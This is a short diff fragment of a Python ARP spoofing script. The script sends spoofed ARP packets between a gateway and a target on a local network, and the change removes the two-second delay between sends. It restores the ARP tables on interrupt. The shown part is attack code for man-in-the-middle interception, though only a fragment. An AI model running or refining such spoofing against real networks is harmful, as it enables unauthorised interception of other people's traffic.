@@ -36,7 +36,7 @@ try:
         spoof("192.168.68.1", "192.168.68.117")
         sent_packets_count += 2
         print(f"\r[+] Packets sent: {sent_packets_count}", end="")
-        time.sleep(2)
+        time.sleep(0)
 except KeyboardInterrupt:
     print("\nCTRL+C pressed .... Reseting ARP tables. Please wait")
     restore(options.target, options.gateway)
